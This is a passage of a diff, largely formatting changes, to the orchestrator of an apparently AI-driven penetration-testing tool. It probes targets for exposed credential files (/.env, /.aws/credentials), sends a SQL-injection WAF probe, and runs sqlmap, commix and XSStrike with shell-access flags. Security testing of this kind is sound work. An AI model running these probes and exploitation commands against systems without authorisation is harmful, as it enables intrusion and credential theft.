                     trivy_findings = len([f for f in findings if f.tool == "trivy"])
@@ -4333,23 +4993,25 @@ class Orchestrator:
                 # Check if .git is exposed
                 ret, git_check = await self._run_command(
                     f"curl -sI {self.safe_target}/.git/config --connect-timeout 5 | head -1",
-                    timeout=10
+                    timeout=10,
                 )
                 if "200" in git_check:
-                    findings.append(Finding(
-                        type="exposed_git",
-                        value=f"{self.target}/.git/config",
-                        description="Git repository exposed - potential source code and credentials leak",
-                        severity="critical",
-                        phase="scan",
-                        tool="gitleaks",
-                        target=self.target
-                    ))
+                    findings.append(
+                        Finding(
+                            type="exposed_git",
+                            value=f"{self.target}/.git/config",
+                            description="Git repository exposed - potential source code and credentials leak",
+                            severity="critical",
+                            phase="scan",
+                            tool="gitleaks",
+                            target=self.target,
+                        )
+                    )
 
                 # Run gitleaks on local output directory for any downloaded content
                 ret, gitleaks_output = await self._run_command(
                     f"gitleaks detect --source {self.output_dir} --report-path {self.output_dir}/gitleaks_{self.domain}.json --report-format json 2>/dev/null",
-                    timeout=120
+                    timeout=120,
                 )
                 if ret == 0 or ret == 1:  # gitleaks returns 1 when secrets found
                     tools_run.append("gitleaks")
@@ -4358,21 +5020,32 @@ class Orchestrator:
                         try:
                             gitleaks_data = json.loads(gitleaks_file.read_text())
                             for secret in gitleaks_data if isinstance(gitleaks_data, list) else []:
-                                findings.append(Finding(
-                                    type="secret_detected",
-                                    value=secret.get("RuleID", "Unknown"),
-                                    description=f"Secret detected: {secret.get('Description', secret.get('RuleID', 'Unknown secret'))}",
-                                    severity="high" if "api" in secret.get("RuleID", "").lower() or "key" in secret.get("RuleID", "").lower() else "medium",
-                                    phase="scan",
-                                    tool="gitleaks",
-                                    target=secret.get("File", self.target),
-                                    metadata={
-                                        "rule": secret.get("RuleID"),
-                                        "file": secret.get("File"),
-                                        "line": secret.get("StartLine"),
-                                        "match": secret.get("Match", "")[:50] + "..." if len(secret.get("Match", "")) > 50 else secret.get("Match", "")
-                                    }
-                                ))
+                                findings.append(
+                                    Finding(
+                                        type="secret_detected",
+                                        value=secret.get("RuleID", "Unknown"),
+                                        description=f"Secret detected: {secret.get('Description', secret.get('RuleID', 'Unknown secret'))}",
+                                        severity=(
+                                            "high"
+                                            if "api" in secret.get("RuleID", "").lower()
+                                            or "key" in secret.get("RuleID", "").lower()
+                                            else "medium"
+                                        ),
+                                        phase="scan",
+                                        tool="gitleaks",
+                                        target=secret.get("File", self.target),
+                                        metadata={
+                                            "rule": secret.get("RuleID"),
+                                            "file": secret.get("File"),
+                                            "line": secret.get("StartLine"),
+                                            "match": (
+                                                secret.get("Match", "")[:50] + "..."
+                                                if len(secret.get("Match", "")) > 50
+                                                else secret.get("Match", "")
+                                            ),
+                                        },
+                                    )
+                                )
                         except (json.JSONDecodeError, FileNotFoundError):
                             pass
                     gitleaks_count = len([f for f in findings if f.tool == "gitleaks"])
@@ -4388,7 +5061,7 @@ class Orchestrator:
             try:
                 ret, trufflehog_output = await self._run_command(
                     f"trufflehog filesystem {self.output_dir} --json --only-verified 2>/dev/null > {self.output_dir}/trufflehog_{self.domain}.json",
-                    timeout=180
+                    timeout=180,
                 )
                 if ret == 0:
                     tools_run.append("trufflehog")
@@ -4399,20 +5072,29 @@ class Orchestrator:
                             for line in trufflehog_file.read_text().strip().split("\n"):
                                 if line.strip():
                                     secret = json.loads(line)
-                                    findings.append(Finding(
-                                        type="verified_secret",
-                                        value=secret.get("DetectorName", "Unknown"),
-                                        description=f"Verified secret: {secret.get('DetectorName', 'Unknown')} - {secret.get('DecoderName', '')}",
-                                        severity="critical",  # Verified secrets are critical
-                                        phase="scan",
-                                        tool="trufflehog",
-                                        target=secret.get("SourceMetadata", {}).get("Data", {}).get("Filesystem", {}).get("file", self.target),
-                                        metadata={
-                                            "detector": secret.get("DetectorName"),
-                                            "verified": secret.get("Verified", False),
-                                            "raw": secret.get("Raw", "")[:30] + "..." if len(secret.get("Raw", "")) > 30 else secret.get("Raw", "")
-                                        }
-                                    ))
+                                    findings.append(
+                                        Finding(
+                                            type="verified_secret",
+                                            value=secret.get("DetectorName", "Unknown"),
+                                            description=f"Verified secret: {secret.get('DetectorName', 'Unknown')} - {secret.get('DecoderName', '')}",
+                                            severity="critical",  # Verified secrets are critical
+                                            phase="scan",
+                                            tool="trufflehog",
+                                            target=secret.get("SourceMetadata", {})
+                                            .get("Data", {})
+                                            .get("Filesystem", {})
+                                            .get("file", self.target),
+                                            metadata={
+                                                "detector": secret.get("DetectorName"),
+                                                "verified": secret.get("Verified", False),
+                                                "raw": (
+                                                    secret.get("Raw", "")[:30] + "..."
+                                                    if len(secret.get("Raw", "")) > 30
+                                                    else secret.get("Raw", "")
+                                                ),
+                                            },
+                                        )
+                                    )
                         except (json.JSONDecodeError, FileNotFoundError):
                             pass
                     trufflehog_count = len([f for f in findings if f.tool == "trufflehog"])
@@ -4437,9 +5119,7 @@ class Orchestrator:
             findings=findings,
             tools_run=tools_run,
             errors=errors,
-            metadata={
-                "scan_ids": self.scan_ids
-            }
+            metadata={"scan_ids": self.scan_ids},
         )
 
         self.phase_results[phase] = result
@@ -4469,7 +5149,7 @@ class Orchestrator:
             "medium": "medium",
             "low": "low",
             "info": "info",
-            "informational": "info"
+            "informational": "info",
         }
         return severity_map.get(severity.lower(), "medium")
 
@@ -4508,7 +5188,7 @@ class Orchestrator:
                 findings=[],
                 tools_run=[],
                 errors=[],
-                metadata={"reason": "Intelligence module disabled"}
+                metadata={"reason": "Intelligence module disabled"},
             )
             self.phase_results[phase] = result
             return result
@@ -4519,7 +5199,9 @@ class Orchestrator:
         self._log_tool("Vulnerability Chaining", "running")
         try:
             # Convert orchestrator findings to models.Finding format for intelligence modules
-            from aipt_v2.models.findings import Finding as ModelsFinding, Severity as ModelsSeverity, VulnerabilityType
+            from aipt_v2.models.findings import Finding as ModelsFinding
+            from aipt_v2.models.findings import Severity as ModelsSeverity
+            from aipt_v2.models.findings import VulnerabilityType
 
             models_findings = []
             for f in self.findings:
@@ -4556,14 +5238,16 @@ class Orchestrator:
                     }
                     vuln_type = vuln_type_map.get(f.type.lower(), VulnerabilityType.OTHER)
 
-                    models_findings.append(ModelsFinding(
-                        title=f.value,
-                        severity=severity,
-                        vuln_type=vuln_type,
-                        url=f.target or self.target,
-                        description=f.description,
-                        source=f.tool,
-                    ))
+                    models_findings.append(
+                        ModelsFinding(
+                            title=f.value,
+                            severity=severity,
+                            vuln_type=vuln_type,
+                            url=f.target or self.target,
+                            description=f.description,
+                            source=f.tool,
+                        )
+                    )
                 except Exception as conv_err:
                     logger.debug(f"Could not convert finding for chaining: {conv_err}")
                     continue
@@ -4573,28 +5257,36 @@ class Orchestrator:
 
             if chains:
                 tools_run.append("vulnerability_chainer")
-                self._log_tool(f"Vulnerability Chaining - {len(chains)} attack chains discovered", "done")
+                self._log_tool(
+                    f"Vulnerability Chaining - {len(chains)} attack chains discovered", "done"
+                )
 
                 # Log critical chains
                 for chain in chains:
                     if chain.max_impact == "Critical":
-                        logger.warning(f"CRITICAL CHAIN: {chain.title} - {chain.impact_description}")
+                        logger.warning(
+                            f"CRITICAL CHAIN: {chain.title} - {chain.impact_description}"
+                        )
 
                         # Add as finding
-                        findings.append(Finding(
-                            type="attack_chain",
-                            value=chain.title,
-                            description=chain.impact_description,
-                            severity="critical",
-                            phase="analyze",
-                            tool="vulnerability_chainer",
-                            target=self.domain,
-                            metadata={
-                                "chain_id": chain.chain_id,
-                                "steps": len(chain.links),
-                                "vulnerabilities": [link.finding.get("title", "") for link in chain.links]
-                            }
-                        ))
+                        findings.append(
+                            Finding(
+                                type="attack_chain",
+                                value=chain.title,
+                                description=chain.impact_description,
+                                severity="critical",
+                                phase="analyze",
+                                tool="vulnerability_chainer",
+                                target=self.domain,
+                                metadata={
+                                    "chain_id": chain.chain_id,
+                                    "steps": len(chain.links),
+                                    "vulnerabilities": [
+                                        link.finding.get("title", "") for link in chain.links
+                                    ],
+                                },
+                            )
+                        )
 
                     # Notify callback
                     if self.on_chain_discovered:
@@ -4602,7 +5294,9 @@ class Orchestrator:
 
                 # Save chains to file
                 chains_data = [c.to_dict() for c in chains]
-                (self.output_dir / "attack_chains.json").write_text(json.dumps(chains_data, indent=2), encoding="utf-8")
+                (self.output_dir / "attack_chains.json").write_text(
+                    json.dumps(chains_data, indent=2), encoding="utf-8"
+                )
             else:
                 self._log_tool("Vulnerability Chaining - No chains found", "done")
 
@@ -4617,7 +5311,10 @@ class Orchestrator:
         try:
             # Reuse models_findings from chaining if available, otherwise convert now
             if not models_findings:
-                from aipt_v2.models.findings import Finding as ModelsFinding, Severity as ModelsSeverity, VulnerabilityType
+                from aipt_v2.models.findings import Finding as ModelsFinding
+                from aipt_v2.models.findings import Severity as ModelsSeverity
+                from aipt_v2.models.findings import VulnerabilityType
+
                 models_findings = []
                 for f in self.findings:
                     try:
@@ -4632,14 +5329,16 @@ class Orchestrator:
                         # Bug fix: Use _get_finding_title() instead of raw f.value
                         # f.value can be a number (e.g., "0" for subdomain_count)
                         finding_title = self._get_finding_title(f)
-                        models_findings.append(ModelsFinding(
-                            title=finding_title,
-                            severity=severity,
-                            vuln_type=VulnerabilityType.OTHER,
-                            url=f.target or self.target,
-                            description=f.description,
-                            source=f.tool,
-                        ))
+                        models_findings.append(
+                            ModelsFinding(
+                                title=finding_title,
+                                severity=severity,
+                                vuln_type=VulnerabilityType.OTHER,
+                                url=f.target or self.target,
+                                description=f.description,
+                                source=f.tool,
+                            )
+                        )
                     except Exception:
                         continue
 
@@ -4655,7 +5354,9 @@ class Orchestrator:
             )
 
             # Save executive summary
-            (self.output_dir / "EXECUTIVE_SUMMARY.md").write_text(triage_result.executive_summary, encoding="utf-8")
+            (self.output_dir / "EXECUTIVE_SUMMARY.md").write_text(
+                triage_result.executive_summary, encoding="utf-8"
+            )
 
             # Log top priorities using get_top_priority() method
             top_assessments = triage_result.get_top_priority(3)
@@ -4679,7 +5380,9 @@ class Orchestrator:
                 self._log_tool(f"Scope Audit - {len(violations)} violations detected!", "done")
                 # Save audit log
                 audit_log = self._scope_enforcer.get_audit_log()
-                (self.output_dir / "scope_audit.json").write_text(json.dumps(audit_log, indent=2), encoding="utf-8")
+                (self.output_dir / "scope_audit.json").write_text(
+                    json.dumps(audit_log, indent=2), encoding="utf-8"
+                )
             else:
                 self._log_tool("Scope Audit - All requests within scope", "done")
             tools_run.append("scope_audit")
@@ -4700,9 +5403,13 @@ class Orchestrator:
             errors=errors,
             metadata={
                 "attack_chains_count": len(self.attack_chains),
-                "top_priorities_count": len(self.triage_result.get_top_priority(10)) if self.triage_result else 0,
-                "scope_violations": len(self._scope_enforcer.get_violations()) if self._scope_enforcer else 0
-            }
+                "top_priorities_count": (
+                    len(self.triage_result.get_top_priority(10)) if self.triage_result else 0
+                ),
+                "scope_violations": (
+                    len(self._scope_enforcer.get_violations()) if self._scope_enforcer else 0
+                ),
+            },
         )
 
         self.phase_results[phase] = result
@@ -4736,12 +5443,12 @@ class Orchestrator:
             baseline_path = f"/aiptx_nonexistent_{int(time.time())}_test"
             ret, baseline_info = await self._run_command(
                 f"curl -s -w '\\n%{{http_code}}\\n%{{size_download}}' {sanitize_for_shell(self.target + baseline_path)} --connect-timeout 5 | tail -2",
-                timeout=10
+                timeout=10,
             )
             baseline_status = "404"
             baseline_size = 0
             if ret == 0:
-                parts = baseline_info.strip().split('\n')
+                parts = baseline_info.strip().split("\n")
                 if len(parts) >= 2:
                     baseline_status = parts[0].strip()
                     try:
@@ -4755,7 +5462,10 @@ class Orchestrator:
                 "/.env": ("critical", ["DB_PASSWORD", "API_KEY", "SECRET", "AWS_", "DATABASE_URL"]),
                 "/.git/config": ("critical", ["[core]", "[remote", "repositoryformatversion"]),
                 "/.aws/credentials": ("critical", ["aws_access_key_id", "aws_secret_access_key"]),
-                "/actuator/env": ("high", ["activeProfiles", "propertySources", "systemProperties"]),
+                "/actuator/env": (
+                    "high",
+                    ["activeProfiles", "propertySources", "systemProperties"],
+                ),
                 "/actuator/health": ("medium", ['"status"', "UP", "DOWN"]),
                 "/actuator": ("medium", ["_links", "actuator"]),
                 "/metrics": ("medium", ["counter", "gauge", "histogram", "process_"]),
@@ -4775,7 +5485,7 @@ class Orchestrator:
                     # Get both status code and response body
                     ret, response = await self._run_command(
                         f"curl -s -w '\\n---HTTP_CODE---%{{http_code}}---SIZE---%{{size_download}}' {sanitize_for_shell(self.target + path)} --connect-timeout 5 2>/dev/null",
-                        timeout=15
+                        timeout=15,
                     )
                     if ret != 0:
                         continue
@@ -4823,39 +5533,43 @@ class Orchestrator:
 
                     if is_valid:
                         validated_findings += 1
-                        findings.append(Finding(
-                            type="exposed_endpoint",
-                            value=f"{self.target}{path}",
-                            description=f"VALIDATED: Sensitive endpoint '{path}' exposes data (matched: '{matched_pattern}')",
-                            severity=severity,
-                            phase="exploit",
-                            tool="path_check",
-                            target=self.target,
-                            metadata={
-                                "http_status": status_code,
-                                "response_size": response_size,
-                                "matched_pattern": matched_pattern,
-                                "validated": True
-                            }
-                        ))
+                        findings.append(
+                            Finding(
+                                type="exposed_endpoint",
+                                value=f"{self.target}{path}",
+                                description=f"VALIDATED: Sensitive endpoint '{path}' exposes data (matched: '{matched_pattern}')",
+                                severity=severity,
+                                phase="exploit",
+                                tool="path_check",
+                                target=self.target,
+                                metadata={
+                                    "http_status": status_code,
+                                    "response_size": response_size,
+                                    "matched_pattern": matched_pattern,
+                                    "validated": True,
+                                },
+                            )
+                        )
                     elif status_code == "200" and response_size > 500:
                         # Large 200 response without pattern match - might still be interesting
                         # Add as info-level for manual review
-                        findings.append(Finding(
-                            type="potential_exposure",
-                            value=f"{self.target}{path}",
-                            description=f"Endpoint '{path}' returns content (HTTP {status_code}, {response_size} bytes) - needs manual review",
-                            severity="info",
-                            phase="exploit",
-                            tool="path_check",
-                            target=self.target,
-                            metadata={
-                                "http_status": status_code,
-                                "response_size": response_size,
-                                "validated": False,
-                                "reason": "No sensitive pattern matched"
-                            }
-                        ))
+                        findings.append(
+                            Finding(
+                                type="potential_exposure",
+                                value=f"{self.target}{path}",
+                                description=f"Endpoint '{path}' returns content (HTTP {status_code}, {response_size} bytes) - needs manual review",
+                                severity="info",
+                                phase="exploit",
+                                tool="path_check",
+                                target=self.target,
+                                metadata={
+                                    "http_status": status_code,
+                                    "response_size": response_size,
+                                    "validated": False,
+                                    "reason": "No sensitive pattern matched",
+                                },
+                            )
+                        )
 
                 except Exception as e:
                     logger.debug(f"Error checking {path}: {e}")
@@ -4863,7 +5577,10 @@ class Orchestrator:
 
             tools_run.append("sensitive_path_check")
             total_checked = len([f for f in findings if f.tool == "path_check"])
-            self._log_tool(f"Sensitive Path Check - {validated_findings} validated, {total_checked - validated_findings} potential", "done")
+            self._log_tool(
+                f"Sensitive Path Check - {validated_findings} validated, {total_checked - validated_findings} potential",
+                "done",
+            )
 
         # 2. WAF Detection
         self._log_tool("WAF Detection", "running")
@@ -4873,22 +5590,26 @@ class Orchestrator:
         waf_probe_url = self.target + "/?id=1'%20OR%20'1'='1"
         ret, output = await self._run_command(
             f"curl -sI {sanitize_for_shell(waf_probe_url)} --connect-timeout 5 | head -1",
-            timeout=10
+            timeout=10,
         )
         waf_detected = "403" in output or "406" in output or "429" in output
-        (self.output_dir / "waf_test.txt").write_text(f"WAF Test Response: {output}\nWAF Detected: {waf_detected}", encoding="utf-8")
+        (self.output_dir / "waf_test.txt").write_text(
+            f"WAF Test Response: {output}\nWAF Detected: {waf_detected}", encoding="utf-8"
+        )
         tools_run.append("waf_detection")
 
         if not waf_detected:
-            findings.append(Finding(
-                type="waf_bypass",
-                value="No WAF detected",
-                description="Target does not appear to have a WAF or WAF is not blocking",
-                severity="low",
-                phase="exploit",
-                tool="waf_detection",
-                target=self.target
-            ))
+            findings.append(
+                Finding(
+                    type="waf_bypass",
+                    value="No WAF detected",
+                    description="Target does not appear to have a WAF or WAF is not blocking",
+                    severity="low",
+                    phase="exploit",
+                    tool="waf_detection",
+                    target=self.target,
+                )
+            )
         self._log_tool(f"WAF Detection - {'Detected' if waf_detected else 'Not detected'}", "done")
 
         # ==================== LLM ATTACK SURFACE ANALYSIS ====================
@@ -4922,8 +5643,12 @@ class Orchestrator:
                     "target": self.target,
                     "analyzed_at": crawler_analysis.analyzed_at.isoformat(),
                     "llm_model": crawler_analysis.llm_model,
-                    "high_priority_parameters": [p.to_dict() for p in crawler_analysis.high_priority_parameters],
-                    "high_priority_forms": [f.to_dict() for f in crawler_analysis.high_priority_forms],
+                    "high_priority_parameters": [
+                        p.to_dict() for p in crawler_analysis.high_priority_parameters
+                    ],
+                    "high_priority_forms": [
+                        f.to_dict() for f in crawler_analysis.high_priority_forms
+                    ],
                     "attack_chains": [c.to_dict() for c in crawler_analysis.attack_chains],
                     "endpoint_categories": crawler_analysis.endpoint_categories,
                     "recommended_tool_order": crawler_analysis.recommended_tool_order,
@@ -4953,22 +5678,25 @@ class Orchestrator:
                 self._log_tool(summary, "done")
 
                 # Add finding for attack surface analysis
-                findings.append(Finding(
-                    type="attack_surface_analysis",
-                    value=f"{len(crawler_analysis.high_priority_parameters)} high-priority parameters identified",
-                    description=crawler_analysis.attack_surface_summary or f"LLM identified {sqli_targets} SQLi, {idor_targets} IDOR, {login_forms} login, {upload_forms} upload targets",
-                    severity="info",
-                    phase="exploit",
-                    tool="llm_crawler_analyzer",
-                    target=self.target,
-                    metadata={
-                        "sqli_targets": sqli_targets,
-                        "idor_targets": idor_targets,
-                        "login_forms": login_forms,
-                        "upload_forms": upload_forms,
-                        "recommended_tools": crawler_analysis.recommended_tool_order,
-                    }
-                ))
+                findings.append(
+                    Finding(
+                        type="attack_surface_analysis",
+                        value=f"{len(crawler_analysis.high_priority_parameters)} high-priority parameters identified",
+                        description=crawler_analysis.attack_surface_summary
+                        or f"LLM identified {sqli_targets} SQLi, {idor_targets} IDOR, {login_forms} login, {upload_forms} upload targets",
+                        severity="info",
+                        phase="exploit",
+                        tool="llm_crawler_analyzer",
+                        target=self.target,
+                        metadata={
+                            "sqli_targets": sqli_targets,
+                            "idor_targets": idor_targets,
+                            "login_forms": login_forms,
+                            "upload_forms": upload_forms,
+                            "recommended_tools": crawler_analysis.recommended_tool_order,
+                        },
+                    )
+                )
 
             except Exception as e:
                 logger.warning(f"LLM Attack Surface Analysis failed: {e}")
@@ -5010,36 +5738,38 @@ class Orchestrator:
                 if crawler_analysis:
                     sqli_targets = crawler_analysis.get_sqli_targets()
                     if sqli_targets:
-                        self._log_tool(f"sqlmap - LLM identified {len(sqli_targets)} SQLi targets", "running")
+                        self._log_tool(
+                            f"sqlmap - LLM identified {len(sqli_targets)} SQLi targets", "running"
+                        )
                         for target in sqli_targets:
                             full_url = ensure_full_url(target.url)
                             if full_url and self.domain in full_url:
                                 # Build URL with parameter
-                                if '?' not in full_url and target.name:
+                                if "?" not in full_url and target.name:
                                     full_url = f"{full_url}?{target.name}=test"
                                 urls_to_test.append(full_url)
 
                 # PRIORITY 2: Add discovered endpoints with query parameters
                 for endpoint in self.discovered_endpoints:
-                    if '?' in endpoint and '=' in endpoint:
+                    if "?" in endpoint and "=" in endpoint:
                         full_url = ensure_full_url(endpoint)
                         if full_url and self.domain in full_url and full_url not in urls_to_test:
                             urls_to_test.append(full_url)
 
                 # PRIORITY 3: Add form actions with POST data
                 for form in self.discovered_forms:
-                    if form.get('method', '').upper() == 'POST' and form.get('inputs'):
-                        action = form.get('action', self.target)
+                    if form.get("method", "").upper() == "POST" and form.get("inputs"):
+                        action = form.get("action", self.target)
                         full_url = ensure_full_url(action)
                         if not full_url or self.domain not in full_url:
                             continue
                         # Build data string from form inputs
                         data_parts = []
-                        for inp in form.get('inputs', []):
-                            if inp.get('name'):
+                        for inp in form.get("inputs", []):
+                            if inp.get("name"):
                                 data_parts.append(f"{inp['name']}=test")
                         if data_parts:
-                            urls_to_test.append((full_url, '&'.join(data_parts)))
+                            urls_to_test.append((full_url, "&".join(data_parts)))
 
                 # PRIORITY 4: Fall back to root URL with crawling if no discoveries
                 if not urls_to_test:
@@ -5058,7 +5788,7 @@ class Orchestrator:
                             f"--batch --level={self.config.sqlmap_level} --risk={self.config.sqlmap_risk} "
                             f"--output-dir={sqlmap_output_dir} --threads=4 {waf_bypass_args} 2>/dev/null"
                         )
-                    elif '?' in str(url_entry):
+                    elif "?" in str(url_entry):
                         # GET with parameters
                         cmd = (
                             f"sqlmap -u {shlex.quote(url_entry)} "
@@ -5075,7 +5805,10 @@ class Orchestrator:
                             f"--answers='sitemap=N,threads=4' {waf_bypass_args} 2>/dev/null"
                         )
 
-                    ret, output = await self._run_command(cmd, timeout=self.config.sqlmap_timeout // max(1, len(urls_to_test[:max_urls])))
+                    ret, output = await self._run_command(
+                        cmd,
+                        timeout=self.config.sqlmap_timeout // max(1, len(urls_to_test[:max_urls])),
+                    )
                     tested_count += 1
 
                     if ret == 0 and output:
@@ -5089,30 +5822,36 @@ class Orchestrator:
 
                             # Record the finding
                             target_url = url_entry[0] if isinstance(url_entry, tuple) else url_entry
-                            findings.append(Finding(
-                                type="sql_injection",
-                                value="SQL Injection Detected",
-                                description=f"SQL injection vulnerability at {target_url}",
-                                severity="critical",
-                                phase="exploit",
-                                tool="sqlmap",
-                                target=target_url,
-                                metadata={"vulnerable_params": vuln_params[-5:]}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="sql_injection",
+                                    value="SQL Injection Detected",
+                                    description=f"SQL injection vulnerability at {target_url}",
+                                    severity="critical",
+                                    phase="exploit",
+                                    tool="sqlmap",
+                                    target=target_url,
+                                    metadata={"vulnerable_params": vuln_params[-5:]},
+                                )
+                            )
 
                             # Mark shell access if OS shell was obtained
                             if "--os-shell" in output or "os-shell" in output:
                                 self.config.shell_obtained = True
-                                self.config.target_os = "linux" if "linux" in output.lower() else "windows"
+                                self.config.target_os = (
+                                    "linux" if "linux" in output.lower() else "windows"
+                                )
 
                 # Save combined output
                 if all_sqlmap_output:
-                    (self.output_dir / f"sqlmap_{self.domain}.txt").write_text("\n\n".join(all_sqlmap_output))
+                    (self.output_dir / f"sqlmap_{self.domain}.txt").write_text(
+                        "\n\n".join(all_sqlmap_output)
+                    )
                     tools_run.append("sqlmap")
 
                 self._log_tool(
                     f"sqlmap - tested {tested_count} URLs, {'VULNERABLE!' if vuln_params else 'no injection found'}",
-                    "done"
+                    "done",
                 )
 
             # 4. Commix - Command Injection Testing (Enhanced with LLM Analysis)
@@ -5129,8 +5868,21 @@ class Orchestrator:
 
                 def is_static_resource(url: str) -> bool:
                     """Skip static resources that won't have command injection."""
-                    static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg', '.map']
-                    path = url.lower().split('?')[0]
+                    static_extensions = [
+                        ".css",
+                        ".js",
+                        ".png",
+                        ".jpg",
+                        ".jpeg",
+                        ".gif",
+                        ".ico",
+                        ".woff",
+                        ".woff2",
+                        ".ttf",
+                        ".svg",
+                        ".map",
+                    ]
+                    path = url.lower().split("?")[0]
                     return any(path.endswith(ext) for ext in static_extensions)
 
                 def ensure_full_url(url: str) -> str:
@@ -5146,7 +5898,7 @@ class Orchestrator:
 
                 # 1. Add discovered endpoints with query parameters (exclude static)
                 for endpoint in self.discovered_endpoints:
-                    if '?' in endpoint and '=' in endpoint and not is_static_resource(endpoint):
+                    if "?" in endpoint and "=" in endpoint and not is_static_resource(endpoint):
                         full_url = ensure_full_url(endpoint)
                         if full_url and self.domain in full_url and full_url not in tested_urls:
                             urls_to_test.append(full_url)
@@ -5154,16 +5906,20 @@ class Orchestrator:
 
                 # 2. Add form actions with POST data (command injection via forms)
                 for form in self.discovered_forms:
-                    if form.get('method', '').upper() == 'POST' and form.get('inputs'):
-                        action = form.get('action', self.target)
+                    if form.get("method", "").upper() == "POST" and form.get("inputs"):
+                        action = form.get("action", self.target)
                         full_url = ensure_full_url(action)
-                        if full_url and self.domain in full_url and not is_static_resource(full_url):
+                        if (
+                            full_url
+                            and self.domain in full_url
+                            and not is_static_resource(full_url)
+                        ):
                             data_parts = []
-                            for inp in form.get('inputs', []):
-                                if inp.get('name'):
+                            for inp in form.get("inputs", []):
+                                if inp.get("name"):
                                     data_parts.append(f"{inp['name']}=test")
                             if data_parts and full_url not in tested_urls:
-                                urls_to_test.append((full_url, '&'.join(data_parts)))
+                                urls_to_test.append((full_url, "&".join(data_parts)))
                                 tested_urls.add(full_url)
 
                 # 3. Fall back to root URL with crawling
@@ -5177,7 +5933,7 @@ class Orchestrator:
                     if isinstance(url_entry, tuple):
                         url, data = url_entry
                         cmd = f"commix -u {shlex.quote(url)} --data={shlex.quote(data)} --batch --level=2 2>/dev/null"
-                    elif '?' in str(url_entry):
+                    elif "?" in str(url_entry):
                         cmd = f"commix -u {shlex.quote(url_entry)} --batch --level=2 2>/dev/null"
                     else:
                         cmd = f"commix -u {shlex.quote(url_entry)} --batch --crawl=1 --level=2 2>/dev/null"
@@ -5188,28 +5944,35 @@ class Orchestrator:
                     if ret == 0 and output:
                         all_commix_output.append(output)
 
-                        if "is vulnerable" in output.lower() or "command injection" in output.lower():
+                        if (
+                            "is vulnerable" in output.lower()
+                            or "command injection" in output.lower()
+                        ):
                             target_url = url_entry[0] if isinstance(url_entry, tuple) else url_entry
-                            findings.append(Finding(
-                                type="command_injection",
-                                value="Command Injection Detected",
-                                description=f"OS command injection vulnerability at {target_url}",
-                                severity="critical",
-                                phase="exploit",
-                                tool="commix",
-                                target=target_url
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="command_injection",
+                                    value="Command Injection Detected",
+                                    description=f"OS command injection vulnerability at {target_url}",
+                                    severity="critical",
+                                    phase="exploit",
+                                    tool="commix",
+                                    target=target_url,
+                                )
+                            )
                             self.config.shell_obtained = True
                             vuln_found = True
 
                 # Save combined output
                 if all_commix_output:
-                    (self.output_dir / f"commix_{self.domain}.txt").write_text("\n\n".join(all_commix_output))
+                    (self.output_dir / f"commix_{self.domain}.txt").write_text(
+                        "\n\n".join(all_commix_output)
+                    )
                     tools_run.append("commix")
 
                 self._log_tool(
                     f"commix - tested {tested_count} URLs, {'VULNERABLE!' if vuln_found else 'no injection found'}",
-                    "done"
+                    "done",
                 )
 
             # 5. XSStrike - XSS Detection (Enhanced with LLM Analysis)
@@ -5237,20 +6000,39 @@ class Orchestrator:
 
                 def is_static_resource(url: str) -> bool:
                     """Skip static resources that won't have XSS."""
-                    static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg', '.map']
-                    path = url.lower().split('?')[0]
+                    static_extensions = [
+                        ".css",
+                        ".js",
+                        ".png",
+                        ".jpg",
+                        ".jpeg",
+                        ".gif",
+                        ".ico",
+                        ".woff",
+                        ".woff2",
+                        ".ttf",
+                        ".svg",
+                        ".map",
+                    ]
+                    path = url.lower().split("?")[0]
                     return any(path.endswith(ext) for ext in static_extensions)
 
                 # PRIORITY 1: Use LLM-identified XSS targets (highest confidence)
                 if crawler_analysis:
                     xss_targets = crawler_analysis.get_xss_targets()
                     if xss_targets:
-                        self._log_tool(f"xsstrike - LLM identified {len(xss_targets)} XSS targets", "running")
+                        self._log_tool(
+                            f"xsstrike - LLM identified {len(xss_targets)} XSS targets", "running"
+                        )
                         for target in xss_targets:
                             full_url = ensure_full_url(target.url)
-                            if full_url and self.domain in full_url and not is_static_resource(full_url):
+                            if (
+                                full_url
+                                and self.domain in full_url
+                                and not is_static_resource(full_url)
+                            ):
                                 # Build URL with parameter
-                                if '?' not in full_url and target.name:
+                                if "?" not in full_url and target.name:
                                     full_url = f"{full_url}?{target.name}=test"
                                 if full_url not in tested_urls:
                                     urls_to_test.append(full_url)
@@ -5266,7 +6048,7 @@ class Orchestrator:
 
                 # PRIORITY 2: Add discovered endpoints with query parameters (exclude static resources)
                 for endpoint in self.discovered_endpoints:
-                    if '?' in endpoint and '=' in endpoint and not is_static_resource(endpoint):
+                    if "?" in endpoint and "=" in endpoint and not is_static_resource(endpoint):
                         full_url = ensure_full_url(endpoint)
                         if full_url and self.domain in full_url and full_url not in tested_urls:
                             urls_to_test.append(full_url)
@@ -5274,9 +6056,14 @@ class Orchestrator:
 
                 # PRIORITY 3: Add form actions (XSS in form inputs) - exclude static
                 for form in self.discovered_forms:
-                    action = form.get('action', self.target)
+                    action = form.get("action", self.target)
                     full_url = ensure_full_url(action)
-                    if full_url and self.domain in full_url and full_url not in tested_urls and not is_static_resource(full_url):
+                    if (
+                        full_url
+                        and self.domain in full_url
+                        and full_url not in tested_urls
+                        and not is_static_resource(full_url)
+                    ):
                         urls_to_test.append(full_url)
                         tested_urls.add(full_url)
 
@@ -5289,7 +6076,7 @@ class Orchestrator:
                 # Test each URL (limit to prevent excessive scanning)
                 max_urls = 15  # Limit for XSStrike
                 for url in urls_to_test[:max_urls]:
-                    if '?' in url:
+                    if "?" in url:
                         # URL with parameters - test directly
                         cmd = f"xsstrike -u {shlex.quote(url)} --blind 2>/dev/null"
                     else:
@@ -5303,14 +6090,14 @@ class Orchestrator:
                         # Sanitize output and remove duplicate lines
                         output = self._sanitize_tool_output(output)
                         # Remove duplicate consecutive lines
-                        lines = output.split('\n')
+                        lines = output.split("\n")
                         unique_lines = []
                         prev_line = None
                         for line in lines:
                             if line.strip() != prev_line:
                                 unique_lines.append(line)
                                 prev_line = line.strip()
-                        output = '\n'.join(unique_lines)
+                        output = "\n".join(unique_lines)
                         all_xsstrike_output.append(f"=== {url} ===\n{output}")
 
                         # Parse XSS findings
@@ -5318,25 +6105,29 @@ class Orchestrator:
                         total_xss_count += xss_count
 
                         if xss_count > 0 or "vulnerable" in output.lower():
-                            findings.append(Finding(
